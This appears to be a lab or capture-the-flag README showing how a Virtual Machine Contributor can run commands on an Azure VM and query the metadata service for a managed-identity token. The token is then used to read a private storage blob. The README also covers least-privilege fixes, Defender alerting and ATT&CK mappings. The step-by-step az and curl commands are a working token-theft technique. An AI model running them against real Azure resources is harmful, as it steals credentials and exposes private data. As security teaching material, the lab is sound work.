# Managed Identity Abuse

## Scenario

A Linux VM is deployed with a **system-assigned managed identity** that has been granted
`Storage Blob Data Reader` on a private storage account containing the flag.

A low-privilege attacker account is given `Virtual Machine Contributor` on the VM —
a role that seems harmless, but allows running arbitrary shell commands via
`az vm run-command invoke`.

By querying the **Instance Metadata Service (IMDS)** from inside the VM, the attacker
retrieves an OAuth token scoped to Azure Storage and reads the flag directly from the
private blob without ever needing the storage account key or a SAS token.

## Attack Path

```
[Attacker] Virtual Machine Contributor
     |
     v
az vm run-command invoke  -->  [VM]  -->  curl IMDS (169.254.169.254)
                                              |
                                              v
                                         access_token (Storage scope)
                                              |
                                              v
                                    [Private Storage Blob]  -->  flag.txt
```

### Step 1 — Authenticate as the attacker

```bash
az login -u <attacker_username> -p <attacker_password>
```

### Step 2 — Get a managed identity token via run-command

```bash
az vm run-command invoke \
  --resource-group managed-identity-abuse \
  --name <vm_name> \
  --command-id RunShellScript \
  --scripts "curl -s -H 'Metadata: true' \
    'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/'"
```

Extract the `access_token` from the JSON response.

### Step 3 — Use the token to read the flag

```bash
curl -H "Authorization: Bearer <access_token>" \
     -H "x-ms-version: 2019-12-12" \
     "https://<storage_account_name>.blob.core.windows.net/flags/flag.txt"
```

## Security Concerns

- **Over-privileged managed identity**: The VM's managed identity should follow least
  privilege — grant only the specific permissions required, scoped to the smallest
  possible resource.
- **Virtual Machine Contributor is not safe**: This role allows `RunCommand` execution,
  effectively giving OS-level code execution. Treat it as equivalent to shell access.
- **IMDS is accessible to any process on the VM**: Any code running on the VM can
  query `169.254.169.254` for tokens. Protect the VM against code injection and
  use network policies to restrict IMDS access to trusted processes where possible.

## How to Fix in Production

1. Scope the managed identity role assignment to the **specific blob** or container,
   not the entire storage account.
2. Restrict `Virtual Machine Contributor` assignments — prefer purpose-built custom
   roles that exclude `Microsoft.Compute/virtualMachines/runCommand/action`.
3. Enable **Microsoft Defender for Cloud** to alert on anomalous IMDS token requests
   and `RunCommand` invocations.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Steal Application Access Token | T1528 |
| Cloud Instance Metadata API | T1552.005 |
| Valid Accounts: Cloud Accounts | T1078.004 |

## References

- [Azure IMDS documentation](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
- [Managed identity best practices](https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/managed-identity-best-practice-recommendations)
- [HackTricks: Azure Managed Identity](https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-services/azure-managed-identities)
